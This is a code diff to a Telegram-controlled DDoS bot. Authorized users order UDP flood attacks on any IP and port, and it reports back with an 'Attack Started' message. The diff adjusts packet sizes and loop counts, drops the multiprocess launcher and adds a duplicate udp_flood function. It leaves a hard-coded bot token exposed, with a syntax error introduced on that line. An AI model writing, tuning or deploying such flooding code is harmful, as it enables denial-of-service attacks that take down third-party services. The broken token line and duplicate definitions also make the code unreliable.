@@ -11,7 +11,7 @@ import logging
 import socket
 
 
-bot = telebot.TeleBot("7599785141:AAGokC8HZXRhjcvSkzd1jBSsinBoNSEX6NU", threaded=False)
+bot = telebot.TeleBot(7599785141:AAGokC8HZXRhjcvSkzd1jBSsinBoNSEX6NU, threaded=False)
 
 AUTHORIZED_USERS = [7418099890]
 
@@ -23,22 +23,27 @@ def udp_flood(target_ip, target_port, stop_flag):
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow socket address reuse
     while not stop_flag.is_set():
         try:
-            packet_size = random.randint(1469)  # Random packet size
+            packet_size = random.randint(64, 1469)  # Random packet size
             data = os.urandom(packet_size)  # Generate random data
-            for _ in range(50000):  # Maximize impact by sending multiple packets
+            for _ in range(20000):  # Maximize impact by sending multiple packets
                 sock.sendto(data, (target_ip, target_port))
         except Exception as e:
             logging.error(f"Error sending packets: {e}")
             break
-def start_udp_flood(user_id, target_ip, target_port):
-    stop_flag = multiprocessing.Event()
-    processes = []
-    for _ in range(min(500, multiprocessing.cpu_count())):
-        process = multiprocessing.Process(target=udp_flood, args=(target_ip, target_port, stop_flag))
-        process.start()
-        processes.append(process)
-    user_attacks[user_id] = (processes, stop_flag)
-    bot.send_message(user_id, f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘁𝗮𝗿𝘁𝗲𝗱🔥\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target_ip}\n𝗣𝗼𝗿𝘁: {target_port}\n᚛ @KaliaYtOwner ᚜\n\n\n*𝙎𝙩𝙤𝙥: रोकने के लिए /stop का उपयोग करें ।*")
+def udp_flood(target_ip, target_port, stop_flag):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    sock.setblocking(False)  # Non-blocking mode
+    data = os.urandom(1469)  # Pre-generate random data
+
+    while not stop_flag.is_set():
+        try:
+            for _ in range(2000):  # Reduce inner loop iterations
+                sock.sendto(data, (target_ip, target_port))
+            time.sleep(0.001)  # Small delay to prevent resource exhaustion
+        except Exception as e:
+            logging.error(f"Error sending packets: {e}")
+            break
 def stop_attack(user_id):
     if user_id in user_attacks:
         processes, stop_flag = user_attacks[user_id]
